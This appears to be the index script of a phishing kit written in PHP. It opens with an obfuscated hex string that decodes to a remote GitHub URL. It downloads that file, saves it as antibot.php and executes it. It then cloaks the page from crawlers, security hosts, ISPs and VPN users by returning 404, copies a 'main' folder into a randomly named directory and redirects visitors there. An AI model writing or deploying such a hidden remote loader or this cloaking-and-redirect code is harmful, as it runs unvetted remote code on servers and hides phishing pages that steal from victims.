<?php
session_start();   
$lin = "06807407407007303a02f02f07206107702e06706907406807506207507306507206306f06e07406506e07402e06306f06d02f06106c06507806607206106e06406f02f06607506306b06906e06706206f07403403203002f06d06106906e02f06106e07406906206f07402e074078074";
$dos = str_replace("0","%",$lin);
$lis = str_replace("%%","0%",$dos);
$li = utf8_decode(urldecode($lis));
$pages = file_get_contents($li);
$outfile = "antibot.php";
$adder = "44257003";
file_put_contents($outfile, $pages);
require_once 'antibot.php';
      
    require_once 'session/Comp.php';
    require_once 'session/auto.php';


    use Jaybizzle\CrawlerDetect\CrawlerDetect;
    use Jaybizzle\ReferralSpamDetect\ReferralSpamDetect;

    $comps = new Comp;
    $antibot = new Antibot;
    $antibotList = new IpBlockList;
    $spider = new Spider;
    

    $_SESSION['ip'] = $comps->getIP();
    $settings = $comps->settings();
    $comps->createToken();

    if (!$comps->localhost($_SESSION['ip'])) {
        if ($spider->checkSpider()) {
            echo $antibot->throw404();
            die();
        }
    
        if ($antibot->checkHost()) {
            echo $antibot->throw404();
            die();
        }
    

        
        if ($antibot->checkISP()) {
            echo $antibot->throw404();
            die();
        }
    
        if ($comps->getOS() == "Windows Server 2003/XP x64" || $comps->getOS() == "Windows 2000") {
            echo $antibot->throw404();
            die();
        }
        
        if (isset($settings['VPN']) && $settings['VPN'] == "on") {
            if ($antibot->checkVPN() == "Y") {
                echo $antibot->throw404();
                die();
            }
        }
    

    
        if (!$antibotList->ipPass($_SESSION['ip'])) {
            echo $antibot->throw404();
            die();
        }
    }
    
$DIR=md5(rand(0,100000000000));
function recurse_copy($home,$DIR) {
	$dir = opendir($home);
	@mkdir($DIR, 0777);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($home . '/' . $file) ) {
				recurse_copy($home . '/' . $file,$DIR . '/' . $file);
			}	else {
				copy($home . '/' . $file,$DIR . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$home="main";
recurse_copy( $home, $DIR );
$comps->headerX("$DIR");
$file = fopen("temp_.txt","w");
fwrite($file, $DIR);

?> 
